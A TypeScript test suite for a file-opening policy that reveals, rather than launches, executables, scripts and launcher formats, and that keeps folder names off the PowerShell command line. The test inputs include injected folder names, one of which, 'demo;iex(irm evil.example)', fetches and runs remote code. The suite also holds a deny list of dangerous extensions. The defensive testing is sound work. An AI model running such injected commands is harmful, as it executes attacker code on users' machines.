import { expect, test } from "bun:test"
import path from "node:path"
import { isOpenWithApp, isUncPath, localFileAction, openWithLaunch } from "./local-file-policy"

const file = { isDirectory: false, mode: 0o644 }

test("reveals Windows executables and shell launchers instead of opening them", () => {
  for (const name of [
    "C:\\x\\setup.EXE",
    "C:\\x\\run.bat",
    "C:\\x\\a.lnk",
    "C:\\x\\a.hta",
    "C:\\x\\a.msi",
    "C:\\x\\a.scr",
  ])
    expect(localFileAction(name, file, "win32", ".COM;.EXE;.BAT;.CMD")).toBe("reveal")
  // Without PATHEXT the Windows defaults apply. An empty value stands for "unset": `undefined` would take the
  // parameter's default, this machine's own PATHEXT.
  expect(localFileAction("C:\\x\\script.ps1", file, "win32", "")).toBe("reveal")
  expect(localFileAction("C:\\x\\notes.md", file, "win32", ".EXE")).toBe("open")
})

test("reveals the rest of the Windows launchers and any alternate data stream", () => {
  for (const name of [
    "C:\\x\\a.pif",
    "C:\\x\\a.CPL",
    "C:\\x\\a.jar",
    "C:\\x\\a.chm",
    "C:\\x\\a.application",
    "C:\\x\\a.appinstaller",
    "C:\\x\\a.msix",
    "C:\\x\\a.settingcontent-ms",
    "C:\\x\\notepad.exe::$DATA",
    "C:\\x\\notes.md:hidden",
  ])
    expect(localFileAction(name, file, "win32", ".EXE")).toBe("reveal")
  // The drive's colon is not part of the file name.
  expect(localFileAction("C:\\x\\report.pdf", file, "win32", ".EXE")).toBe("open")
})

test("reveals macOS bundles and scripts", () => {
  for (const name of ["/Applications/X.app", "/tmp/run.command", "/tmp/a.terminal", "/tmp/a.workflow"])
    expect(localFileAction(name, { isDirectory: name.endsWith(".app"), mode: 0o755 }, "darwin")).toBe("reveal")
  for (const name of ["/tmp/a.fileloc", "/tmp/a.webloc", "/tmp/a.inetloc", "/tmp/a.scptd", "/tmp/a.mobileconfig"])
    expect(localFileAction(name, file, "darwin")).toBe("reveal")
  expect(localFileAction("/tmp/report.pdf", file, "darwin")).toBe("open")
})

test("reveals any POSIX file with an execute bit", () => {
  expect(localFileAction("/tmp/tool", { isDirectory: false, mode: 0o755 }, "linux")).toBe("reveal")
  expect(localFileAction("/tmp/tool", { isDirectory: false, mode: 0o700 }, "linux")).toBe("reveal")
  expect(localFileAction("/tmp/readme.txt", file, "linux")).toBe("open")
  expect(localFileAction("/tmp/folder", { isDirectory: true, mode: 0o755 }, "linux")).toBe("open")
})

test("a custom PATHEXT adds to the Windows defaults instead of replacing them", () => {
  for (const name of ["C:\\x\\run.bat", "C:\\x\\a.ps1", "C:\\x\\a.vbs", "C:\\x\\tool.py"])
    expect(localFileAction(name, file, "win32", ".PY")).toBe("reveal")
  expect(localFileAction("C:\\x\\notes.md", file, "win32", ".PY")).toBe("open")
})

test("reveals the remaining Windows and macOS launcher formats", () => {
  for (const extension of [
    ".rdp",
    ".scf",
    ".theme",
    ".themepack",
    ".library-ms",
    ".search-ms",
    ".inf",
    ".sct",
    ".wsc",
    ".xll",
    ".diagcab",
  ])
    expect(localFileAction(`C:\\x\\a${extension.toUpperCase()}`, file, "win32", ".EXE")).toBe("reveal")
  for (const name of ["/tmp/a.dmg", "/tmp/a.vncloc", "/tmp/a.rdp"])
    expect(localFileAction(name, file, "darwin")).toBe("reveal")
})

test("recognises UNC and device paths written with either separator", () => {
  for (const value of [
    "\\\\host\\share",
    "\\\\?\\C:\\x",
    "\\\\.\\pipe\\x",
    "//host/share",
    "/\\host\\share",
    "\\/host/share",
  ])
    expect(isUncPath(value)).toBe(true)
  for (const value of ["C:\\work\\repo", "/work/repo", "\\work\\repo", "relative"]) expect(isUncPath(value)).toBe(false)
})

test("only the applications Open in offers may open a folder", () => {
  expect(isOpenWithApp("Visual Studio Code", "darwin")).toBe(true)
  expect(isOpenWithApp("Terminal", "darwin")).toBe(true)
  expect(isOpenWithApp("code", "win32")).toBe(true)
  expect(isOpenWithApp("powershell", "win32")).toBe(true)
  expect(isOpenWithApp("code", "linux")).toBe(true)
  for (const app of ["python3", "node", "cmd", "bash", "sh", "Code", "Terminal"]) {
    expect(isOpenWithApp(app, "linux")).toBe(false)
    expect(isOpenWithApp(app, "win32")).toBe(false)
  }
  expect(isOpenWithApp("python3", "darwin")).toBe(false)
  expect(isOpenWithApp("powershell", "darwin")).toBe(false)
  expect(isOpenWithApp("code", "freebsd")).toBe(false)
})

test("reveals .jar on every platform, .py on macOS and the newer Windows package and shell formats", () => {
  expect(localFileAction("C:\\x\\tool.JAR", file, "win32", ".EXE")).toBe("reveal")
  expect(localFileAction("/tmp/tool.jar", file, "darwin")).toBe("reveal")
  expect(localFileAction("/tmp/tool.jar", file, "linux")).toBe("reveal")
  expect(localFileAction("/tmp/script.py", file, "darwin")).toBe("reveal")
  expect(localFileAction("/tmp/script.py", file, "linux")).toBe("open")
  for (const extension of [
    ".searchconnector-ms",
    ".desktopthemepackfile",
    ".msu",
    ".appx",
    ".appxbundle",
    ".msixbundle",
  ])
    expect(localFileAction(`C:\\x\\a${extension.toUpperCase()}`, file, "win32", ".EXE")).toBe("reveal")
})

test("Open in PowerShell starts in the folder and never puts it on the command line", () => {
  const powershell = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
  for (const name of ["demo;iex(irm evil.example)", "x$(calc)", "my project", "plain"]) {
    const folder = path.win32.join("C:\\work", name)
    const launch = openWithLaunch("powershell", folder, powershell, "win32")
    expect(launch.command).toBe(powershell)
    expect(launch.args).toEqual(["-NoExit"])
    expect(launch.args.some((arg) => arg.includes(name))).toBe(false)
    expect(launch.options).toEqual({ cwd: folder, detached: true, stdio: "ignore" })
  }
})

test("Open in an editor passes the folder as its one argument, and macOS uses open -a", () => {
  const folder = path.win32.join("C:\\work", "my project")
  expect(openWithLaunch("code", folder, "C:\\VS Code\\Code.exe", "win32")).toEqual({
    command: "C:\\VS Code\\Code.exe",
    args: [folder],
  })
  const posixFolder = path.posix.join("/work", "my project")
  expect(openWithLaunch("zed", posixFolder, "/usr/bin/zed", "linux")).toEqual({
    command: "/usr/bin/zed",
    args: [posixFolder],
  })
  expect(openWithLaunch("Terminal", posixFolder, "Terminal", "darwin")).toEqual({
    command: "open",
    args: ["-a", "Terminal", posixFolder],
  })
})
